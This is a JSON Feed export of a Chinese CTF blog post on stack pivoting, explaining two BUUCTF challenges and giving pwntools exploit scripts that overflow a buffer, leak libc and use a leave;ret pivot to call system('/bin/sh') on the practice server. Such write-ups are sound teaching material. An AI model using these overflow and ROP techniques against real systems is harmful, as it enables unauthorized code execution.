{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"栈迁移\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "url": "http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/",
            "title": "栈迁移",
            "date_published": "2021-01-25T10:10:27.000Z",
            "content_html": "<h2 id=\"spwn栈-bss\"><a class=\"markdownIt-Anchor\" href=\"#spwn栈-bss\">#</a> spwn（栈 -&gt;bss）</h2>\n<p>本题考察的是栈迁移</p>\n<p>进入 IDA 进行分析，我们可以看到本题为我们提供了两个输入：</p>\n<p>第一次输入我们可以把数据写入到程序的 bss 段；</p>\n<p>第二次输入我们可以造成溢出，但是只能 8 个字节，做 rop 链显然是太短了，但好在程序之中有 leave 片段</p>\n<p>在 32 位汇编下相当于:</p>\n<blockquote>\n<p>mov esp,ebp;<br>\npop ebp</p>\n</blockquote>\n<p>将栈顶指针 esp 指向帧指针 ebp，然后 pop 备份的原帧指针到 ebp，实现栈迁移</p>\n<p>由于我们的程序是 32 位程序，我们可以覆盖把 ebp 覆盖成 bss 段地址之后执行 leave 指令，这样我们 ebp 便指向了 bss 段，我们便可以执行我们第一次输入到 bss 段的内容；</p>\n<p>之后是正常的 rop 过程。</p>\n<p>完整流程如下：</p>\n<blockquote>\n<p>1. 第一轮的第一次输入把泄露函数地址的 rop 链写入 bss 段；</p>\n<p>2. 第一轮的第二次输入进行栈迁移至 bss 段将函数地址泄露；</p>\n<p>3. 跳转到 main 进行第二轮执行；</p>\n<p>3. 查找 libc 库；</p>\n<p>4. 使用 system 构造新的 rop 链；</p>\n<p>5. 第二轮的第一次输入输入新的 rop 链；</p>\n<p>6. 第一轮的第二次输入进行栈迁移至 bss 来 getshell。</p>\n</blockquote>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher\n\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span>\n\np <span class=\"token operator\">=</span> remote <span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28070</span><span class=\"token punctuation\">)</span>\n\nwrite_plt <span class=\"token operator\">=</span> <span class=\"token number\">0x8048380</span>\nwrite_got <span class=\"token operator\">=</span> <span class=\"token number\">0x804A01C</span>\nmian_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x8048513</span> \nleave_ret<span class=\"token operator\">=</span> <span class=\"token number\">0x08048511</span>    <span class=\"token comment\">#leave 汇编片段leave指令是将栈顶指针esp指向帧指针ebp，然后pop备份的原帧指针到%ebp，实现栈迁移</span>\nbss_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x804A300</span>\n\npayload1 <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>write_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>mian_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>write_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\npayload2 <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bss_addr<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span>   <span class=\"token comment\">#第二个为ebp，因为有pop ebp的缘故，会将栈顶指针esp - 4，将ebp覆盖为想要调整到的位置需-4</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\nwrite_addr <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>write_addr<span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write_addr<span class=\"token punctuation\">)</span>\nlibcbase <span class=\"token operator\">=</span> write_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">)</span>\nsys_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span>\nbinsh_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span>\n\npayload3 <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>sys_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>mian_addr<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>binsh_addr<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"name?\"</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span> <span class=\"token string\">\"say?\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#这题用sendline不行，原因是sendline会发送一个回车符</span></code></pre>\n<h2 id=\"ciscn_2019_es_2栈-栈\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_2栈-栈\">#</a> ciscn_2019_es_2（栈 -&gt; 栈）</h2>\n<p>同样是一道栈迁移题目，根据 IDA 打开来看可以发现我们的输入距离 ebp 位置有 0x28 个字节，我们可以填入 0x28 个字节让接下来的 printf 函数直接打印出 ebp 的值。</p>\n<p>接下来我们可以动调一下来看看我们 ebp 的值距离我们输入字符串位置的偏移是多少，可以发现是 0x38，那么我们就能知道我们输入的地址为 ebp 的值减去 0x38</p>\n<p>接下来是第二次输入，需要知道第二次输入同样是 0x30 个字符：本题目中没有现成的’/bin/sh’字符，我们需要构造一个指向我们输入的’/bin/sh’地址的值来作为 system 函数的参数，填满 0x28 个字节后覆盖 ebp 指向我们的输入地址，之后是 leave 栈迁移 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span>\n\n<span class=\"token comment\">#p=process('ciscn_2019_es_2')</span>\n\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26666</span><span class=\"token punctuation\">)</span>\n\nleave <span class=\"token operator\">=</span> <span class=\"token number\">0x080484b8</span>\nsystem_plt<span class=\"token operator\">=</span><span class=\"token number\">0x8048400</span> \n\npayload1 <span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token string\">'abcdefgh'</span>  <span class=\"token comment\">#完全覆盖至printf输出栈上，输出ebp</span>\n\n<span class=\"token comment\">#这里esp距离ebp有0x28个字节我们直接输入0x28个来打印ebp算出偏移</span>\n<span class=\"token comment\">#刚好能输出ebp就不要多想，直接覆盖0x28就完事</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'abcdefgh'</span><span class=\"token punctuation\">)</span>\ns_adder <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x38</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>s_adder<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npayload2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bbbb'</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>system_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'cccc'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>s_adder <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>s_adder<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>leave<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "PWN",
                "BUUCTF",
                "栈迁移"
            ]
        }
    ]
}